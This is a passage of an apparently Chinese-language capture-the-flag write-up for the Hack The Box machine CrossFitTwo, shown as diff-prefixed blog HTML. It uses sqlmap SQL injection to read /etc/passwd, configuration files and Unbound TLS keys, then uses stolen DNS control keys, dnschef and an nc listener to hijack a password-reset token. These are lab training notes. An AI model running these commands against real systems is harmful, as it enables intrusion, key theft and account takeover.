+<h3 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h3><pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=&quot;/etc/passwd&quot;
+
+root:*:0:0:Charlie &amp;:/root:/bin/ksh
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &amp;:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
+_identd:*:29:29:identd:/var/empty:/sbin/nologin
+_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
+_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
+_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
+_x11:*:35:35:X Server:/var/empty:/sbin/nologin
+_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
+_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
+_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
+_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
+_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
+_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
+_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
+_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
+_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
+_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
+_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
+www:*:67:67:HTTP Server:/var/www:/sbin/nologin
+_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
+_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
+_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
+_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
+_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
+_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
+_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
+_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
+_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
+_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
+_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
+_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
+_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
+_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
+_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
+_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
+_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
+_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
+_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
+_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
+_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
+_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
+_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
+_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
+_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
+_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
+_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
+_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
+_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
+_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
+_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
+_file:*:104:104:file privsep:/var/empty:/sbin/nologin
+_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
+_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
+_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
+_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
+_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
+_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
+_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
+_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
+nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
+_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
+lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
+node:*:1003:1003::/home/node:/bin/ksh
+_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
+_redis:*:686:686:redis account:/var/redis:/sbin/nologin
+david:*:1004:1004:,,,:/home/david:/bin/csh
+john:*:1005:1005::/home/john:/bin/csh
+ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
+</code></pre>
+<h3 id="x2F-etc-x2F-login-conf"><a href="#x2F-etc-x2F-login-conf" class="headerlink" title="&#x2F;etc&#x2F;login.conf"></a>&#x2F;etc&#x2F;login.conf</h3><p>根据配置文件，使用有yubikey：</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=&quot;/etc/login.conf&quot;
+
+# $OpenBSD: login.conf,v 1.16 2020/06/23 15:45:34 naddy Exp $
+
+#
+# Sample login.conf file.  See login.conf(5) for details.
+#
+
+#
+# Standard authentication styles:
+#
+# passwd        Use only the local password file
+# chpass        Do not authenticate, but change user&#39;s password (change
+#               the YP password if the user has one, else change the
+#               local password)
+# lchpass       Do not login; change user&#39;s local password instead
+# radius        Use radius authentication
+# reject        Use rejected authentication
+# skey          Use S/Key authentication
+# activ         ActivCard X9.9 token authentication
+# crypto        CRYPTOCard X9.9 token authentication
+# snk           Digital Pathways SecureNet Key authentication
+# tis           TIS Firewall Toolkit authentication
+# token         Generic X9.9 token authentication
+# yubikey       YubiKey authentication
+#
+
+# Default allowed authentication styles
+auth-defaults:auth=passwd,skey:
+
+# Default allowed authentication styles for authentication type ftp
+auth-ftp-defaults:auth-ftp=passwd:
+
+#
+# The default values
+# To alter the default authentication types change the line:
+#       :tc=auth-defaults:\
+# to read something like: (enables passwd, &quot;myauth&quot;, and activ)
+#       :auth=passwd,myauth,activ:\
+# Any value changed in the daemon class should be reset in default
+# class.
+#
+default:\
+        :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\
+        :umask=022:\
+        :datasize-max=768M:\
+        :datasize-cur=768M:\
+        :maxproc-max=256:\
+        :maxproc-cur=128:\
+        :openfiles-max=102400:\
+        :openfiles-cur=102400:\
+        :stacksize-cur=4M:\
+        :localcipher=blowfish,a:\
+        :tc=auth-defaults:\
+        :tc=auth-ftp-defaults:
+
+#
+# Settings used by /etc/rc and root
+# This must be set properly for daemons started as root by inetd as well.
+# Be sure to reset these values to system defaults in the default class!
+#
+daemon:\
+        :ignorenologin:\
+        :datasize=infinity:\
+        :maxproc=infinity:\
+        :openfiles-max=102400:\
+        :openfiles-cur=102400:\
+        :stacksize-cur=8M:\
+        :auth-ssh=yubikey:\
+        :auth-su=reject:\
+        :tc=default:
+
+#
+# Staff have fewer restrictions and can login even when nologins are set.
+#
+staff:\
+        :datasize-cur=1536M:\
+        :datasize-max=infinity:\
+        :maxproc-max=512:\
+        :maxproc-cur=256:\
+        :ignorenologin:\
+        :requirehome@:\
+        :tc=default:
+
+#
+# Authpf accounts get a special motd and shell
+#
+authpf:\
+        :welcome=/etc/motd.authpf:\
+        :shell=/usr/sbin/authpf:\
+        :tc=default:
+
+#
+# Building ports with DPB uses raised limits
+#
+pbuild:\
+        :datasize-max=infinity:\
+        :datasize-cur=8192M:\
+        :maxproc-max=1024:\
+        :maxproc-cur=384:\
+        :priority=5:\
+        :tc=default:
+
+#
+# Override resource limits for certain daemons started by rc.d(8)
+#
+bgpd:\
+        :openfiles=512:\
+        :tc=daemon:
+
+unbound:\
+        :openfiles=512:\
+        :tc=daemon:
+</code></pre>
+<h3 id="x2F-etc-x2F-ssh-x2F-sshd-config"><a href="#x2F-etc-x2F-ssh-x2F-sshd-config" class="headerlink" title="&#x2F;etc&#x2F;ssh&#x2F;sshd_config"></a>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</h3><p>root需要公钥和密码，非root需要密码</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=&quot;/etc/ssh/sshd_config&quot;
+
+#   $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $
+
+# This is the sshd server system-wide configuration file.  See
+# sshd_config(5) for more information.
+
+# The strategy used for options in the default sshd_config shipped with
+# OpenSSH is to specify options with their default value where
+# possible, but leave them commented.  Uncommented options override the
+# default value.
+
+#Port 22
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+#HostKey /etc/ssh/ssh_host_rsa_key
+#HostKey /etc/ssh/ssh_host_ecdsa_key
+#HostKey /etc/ssh/ssh_host_ed25519_key
+
+# Ciphers and keying
+#RekeyLimit default none
+
+# Logging
+#SyslogFacility AUTH
+#LogLevel INFO
+
+# Authentication:
+
+#LoginGraceTime 2m
+PermitRootLogin yes
+#StrictModes yes
+#MaxAuthTries 6
+#MaxSessions 10
+
+#PubkeyAuthentication yes
+
+# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
+# but this is overridden so installations will only check .ssh/authorized_keys
+AuthorizedKeysFile  .ssh/authorized_keys
+
+#AuthorizedPrincipalsFile none
+
+#AuthorizedKeysCommand none
+#AuthorizedKeysCommandUser nobody
+
+# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
+#HostbasedAuthentication no
+# Change to yes if you don&#39;t trust ~/.ssh/known_hosts for
+# HostbasedAuthentication
+#IgnoreUserKnownHosts no
+# Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files
+#IgnoreRhosts yes
+
+# To disable tunneled clear text passwords, change to no here!
+#PasswordAuthentication yes
+#PermitEmptyPasswords no
+
+# Change to no to disable s/key passwords
+#ChallengeResponseAuthentication yes
+
+#AllowAgentForwarding yes
+#AllowTcpForwarding yes
+#GatewayPorts no
+#X11Forwarding no
+#X11DisplayOffset 10
+#X11UseLocalhost yes
+#PermitTTY yes
+#PrintMotd yes
+#PrintLastLog yes
+#TCPKeepAlive yes
+#PermitUserEnvironment no
+#Compression delayed
+#ClientAliveInterval 0
+#ClientAliveCountMax 3
+#UseDNS no
+#PidFile /var/run/sshd.pid
+#MaxStartups 10:30:100
+#PermitTunnel no
+#ChrootDirectory none
+#VersionAddendum none
+
+# no default banner path
+#Banner none
+
+# override default of no subsystems
+Subsystem   sftp    /usr/libexec/sftp-server
+
+# Example of overriding settings on a per-user basis
+#Match User anoncvs
+#   X11Forwarding no
+#   AllowTcpForwarding no
+#   PermitTTY no
+#   ForceCommand cvs server
+
+Match User root
+    AuthenticationMethods publickey,password
+Match User *,!root
+    AuthenticationMethods password
+</code></pre>
+<h3 id="x2F-etc-x2F-httpd-conf"><a href="#x2F-etc-x2F-httpd-conf" class="headerlink" title="&#x2F;etc&#x2F;httpd.conf"></a>&#x2F;etc&#x2F;httpd.conf</h3><p>根据配置文件，除了chat和employees还有其他的：</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=&quot;/etc/httpd.conf&quot;
+
+# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $
+
+types {
+    include &quot;/usr/share/misc/mime.types&quot;
+}
+
+server &quot;0.0.0.0&quot; {
+        no log
+        listen on lo0 port 8000
+
+        root &quot;/htdocs&quot;
+        directory index index.php
+
+        location &quot;*.php*&quot; {
+                fastcgi socket &quot;/run/php-fpm.sock&quot;
+        }
+}
+
+server &quot;employees&quot; {
+        no log
+        listen on lo0 port 8001
+
+        root &quot;/htdocs_employees&quot;
+        directory index index.php
+
+        location &quot;*.php*&quot; {
+                fastcgi socket &quot;/run/php-fpm.sock&quot;
+        }
+}
+
+server &quot;chat&quot; {
+        no log
+        listen on lo0 port 8002
+
+        root &quot;/htdocs_chat&quot;
+        directory index index.html
+
+        location match &quot;^/home$&quot; {
+            request rewrite &quot;/index.html&quot;
+        }
+        location match &quot;^/login$&quot; {
+            request rewrite &quot;/index.html&quot;
+        }
+        location match &quot;^/chat$&quot; {
+            request rewrite &quot;/index.html&quot;
+        }
+        location match &quot;^/favicon.ico$&quot; {
+            request rewrite &quot;/images/cross.png&quot;
+        }
+}
+</code></pre>
+<h3 id="x2F-etc-x2F-relayd-conf"><a href="#x2F-etc-x2F-relayd-conf" class="headerlink" title="&#x2F;etc&#x2F;relayd.conf"></a>&#x2F;etc&#x2F;relayd.conf</h3><p>得到crossfit-club.htb，加hosts：</p>
+<pre><code class="Plain">echo 10.10.10.232 crossfit-club.htb &gt;&gt; /etc/hosts
+</code></pre>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=&quot;/etc/relayd.conf&quot;
+
+table&lt;1&gt;{127.0.0.1}
+table&lt;2&gt;{127.0.0.1}
+table&lt;3&gt;{127.0.0.1}
+table&lt;4&gt;{127.0.0.1}
+http protocol web{
+        pass request quick header &quot;Host&quot; value &quot;*crossfit-club.htb&quot; forward to &lt;3&gt;
+        pass request quick header &quot;Host&quot; value &quot;*employees.crossfit.htb&quot; forward to &lt;2&gt;
+        match request path &quot;/*&quot; forward to &lt;1&gt;
+        match request path &quot;/ws*&quot; forward to &lt;4&gt;
+        http websockets
+}
+
+table&lt;5&gt;{127.0.0.1}
+table&lt;6&gt;{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
+http protocol portal{
+        pass request quick path &quot;/&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/index.html&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/home&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/login&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/chat&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/js/*&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/css/*&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/fonts/*&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/images/*&quot; forward to &lt;5&gt;
+        pass request quick path &quot;/favicon.ico&quot; forward to &lt;5&gt;
+        pass forward to &lt;6&gt;
+        http websockets
+}
+
+relay web{
+        listen on &quot;0.0.0.0&quot; port 80
+        protocol web
+        forward to &lt;1&gt; port 8000
+        forward to &lt;2&gt; port 8001
+        forward to &lt;3&gt; port 9999
+        forward to &lt;4&gt; port 4419
+}
+
+relay portal{
+        listen on 127.0.0.1 port 9999
+        protocol portal
+        forward to &lt;5&gt; port 8002
+        forward to &lt;6&gt; port 5000 mode source-hash
+}
+</code></pre>
+<p>吐槽一下，注入读文件是真的慢，慢的有点离谱了</p>
+<p>咱们访问一下新发现的页面</p>
+
+
+<p>似乎又是一个登录页面，但咱们依然没有账号密码</p>
+
+
+<p>本想注册一个账号，却发现被禁止注册了</p>
+
+
+<p>在流量内发现请求了</p>
+<pre><code class="Plain">/api/auth
+</code></pre>
+<p>，咱们fuzz一下其他api看看</p>
+<pre><code class="Plain">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/
+
+┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://crossfit-club.htb/api/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              json
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2021/08/02 19:14:30 Starting gobuster in directory enumeration mode
+===============================================================
+http://crossfit-club.htb/api/auth                 (Status: 200) [Size: 66]
+http://crossfit-club.htb/api/ping                 (Status: 200) [Size: 71]
+
+===============================================================
+2021/08/02 19:15:51 Finished
+===============================================================
+</code></pre>
+<pre><code class="Plain">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/
+
+┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://crossfit-club.htb/api/
+[+] Method:                  POST
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              json
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2021/08/02 19:22:33 Starting gobuster in directory enumeration mode
+===============================================================
+http://crossfit-club.htb/api/Login                (Status: 200) [Size: 50]
+http://crossfit-club.htb/api/login                (Status: 200) [Size: 50]
+http://crossfit-club.htb/api/signup               (Status: 200) [Size: 50]
+
+===============================================================
+2021/08/02 19:23:53 Finished
+===============================================================
+</code></pre>
+<p>在api中发现了signup，咱们访问一下看看</p>
+
+
+<p>访问后提示无法GET获取</p>
+<pre><code class="Plain">/api/signup
+</code></pre>
+<p>，咱们使用burp抓包试试</p>
+
+
+<p>这边提示咱们CSRF Token不对</p>
+
+
+<p>稍微修改后，提示只有管理员可以注册用户</p>
+<pre><code class="Plain">POST /api/signup HTTP/1.1
+Host: crossfit-club.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: connect.sid=s%3Ae44z5Xt6fe5g1VLuMNHs-ZD7sFPh8C4k.NEClY9BvwLeMaL3zZCfxvxxFZfHp6iak0Xa8QLTO1pw
+Upgrade-Insecure-Requests: 1
+Content-Length: 113
+X-CSRF-Token: xmiei8Ex-OKmxFdQOUaVH_4aoIjuUT-dz6HQ
+
+{
+    &quot;username&quot;:&quot;lucifiel&quot;,
+    &quot;password&quot;:&quot;lucifiel123&quot;,
+    &quot;email&quot;:&quot;lucifiel@crossfit.htb&quot;,
+    &quot;confirm&quot;:&quot;lucifiel123&quot;
+}
+</code></pre>
+<p>咱们把目光放在8953端口上，这个是<code>Unbound</code>的<code>control-part</code>端口，咱们通过sql去读取 &gt; <a href="https://man.openbsd.org/unbound.conf" target="_blank" rel="noopener">https://man.openbsd.org/unbound.conf</a></p>
+<h3 id="x2F-var-x2F-unbound-x2F-etc-x2F-unbound-conf"><a href="#x2F-var-x2F-unbound-x2F-etc-x2F-unbound-conf" class="headerlink" title="&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf"></a>&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf</h3><pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/unbound.conf&quot;
+
+server:
+        interface: 127.0.0.1
+        interface: ::1
+        access-control: 0.0.0.0/0 refuse
+        access-control: 127.0.0.0/8 allow
+        access-control: ::0/0 refuse
+        access-control: ::1 allow
+        hide-identity: yes
+        hide-version: yes
+        msg-cache-size: 0
+        rrset-cache-size: 0
+        cache-max-ttl: 0
+        cache-max-negative-ttl: 0
+        auto-trust-anchor-file: &quot;/var/unbound/db/root.key&quot;
+        val-log-level: 2
+        aggressive-nsec: yes
+        include: &quot;/var/unbound/etc/conf.d/local_zones.conf&quot;
+
+remote-control:
+        control-enable: yes
+        control-interface: 0.0.0.0
+        control-use-cert: yes
+        server-key-file: &quot;/var/unbound/etc/tls/unbound_server.key&quot;
+        server-cert-file: &quot;/var/unbound/etc/tls/unbound_server.pem&quot;
+        control-key-file: &quot;/var/unbound/etc/tls/unbound_control.key&quot;
+        control-cert-file: &quot;/var/unbound/etc/tls/unbound_control.pem&quot;
+</code></pre>
+<p>咱们需要下载下面这些文件</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/tls/unbound_server.pem&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/tls/unbound_control.key&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/tls/unbound_control.pem&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/tls/unbound_server.key&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/etc/httpd.conf&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/etc/passwd&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/var/unbound/etc/unbound.conf&quot;
+sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=&quot;/etc/relayd.conf&quot;
+</code></pre>
+<p>修改<code>crossfit.conf</code>文件内容</p>
+<pre><code class="Plain">remote-control:
+    control-enable: yes
+    control-use-cert: &quot;yes&quot;
+    server-cert-file: &quot;/etc/unbound/unbound_server.pem&quot;
+    control-key-file: &quot;/etc/unbound/unbound_control.key&quot;
+    control-cert-file: &quot;/etc/unbound/unbound_control.pem&quot;
+</code></pre>
+<p>将所有证书文件都放到<code>/etc/unbound/</code>目录下</p>
+<p>然后检查一下状态</p>
+<pre><code class="Plain">unbound-control -c crossfit.conf -s 10.10.10.232 status
+
+┌──(root💀root)-[~/Desktop]
+└─# unbound-control -c crossfit.conf -s 10.10.10.232 status
+version: 1.11.0
+verbosity: 1
+threads: 1
+modules: 2 [ validator iterator ]
+uptime: 44 seconds
+options: control(ssl)
+unbound (pid 55403) is running...
+</code></pre>
+<p>从<code>relayd</code>配置文件中，知道了我们可以配置的是<code>*employees.crossfit.htb</code>，现在我们操作起来</p>
+<p>我们在前面添加其他字符，并且控制对应dns，以达到密码劫持充值链接的目的</p>
+<p>将dns请求转发到我们的dns服务器</p>
+<pre><code class="Plain">unbound-control -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.27@53
+</code></pre>
+<p>将<code>xemployees.crossfit.htb</code>添加到<code>/etc/hosts</code></p>
+<pre><code class="Plain">echo 10.10.10.232 xemployees.crossfit.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>使用dnschef进行劫持 &gt; <a href="https://github.com/LucifielHack/dnschef" target="_blank" rel="noopener">https://github.com/LucifielHack/dnschef</a></p>
+<p>本地使用nc监听80端口</p>
+<pre><code class="Plain">nc -nvlp 80
+</code></pre>
+<p>然后unbound添加一条规则，将dns请求转发到我们的dns服务器</p>
+<pre><code class="Plain">unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.2
+</code></pre>
+<p>使用如下命令来获得重置链接</p>
+<pre><code class="Plain">sudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1
+sudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.2
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# nc -nvlp 80
+listening on [any] 80 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.232] 1352
+GET /password-reset.php?token=ffe51814f0831927a5bff7ad15a09cdac20d68afe0d4945f4b32ead391d6ceeb03a9e25a07299c49947776cfd9f2ab6422260817233b1818ae8b86ca273de465 HTTP/1.1
+Host: xemployees.crossfit.htb
+User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://crossfit-club.htb/
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p>成功返回token值</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&title=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&title=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/05/20/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/MacBook-M1-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">MacBook M1 渗透测试环境踩坑日记</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/05/07/Hackthebox/Easy/Hackthebox-MonitorsTwo/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">MonitorsTwo - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
